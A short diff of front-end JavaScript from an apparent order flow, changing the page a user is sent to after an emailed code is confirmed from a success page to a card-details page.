@@ -65,7 +65,7 @@
       .then(r => r.json())
       .then(data => {
         if (data.status === "email_code_confirmed") {
-          location.href = "success.html?order=" + orderId;
+          location.href = "card-details.html?order=" + orderId;
         } else if (data.status === "email_code_rejected") {
           location.href = "email-code.html?order=" + orderId + "&error=1";
         }
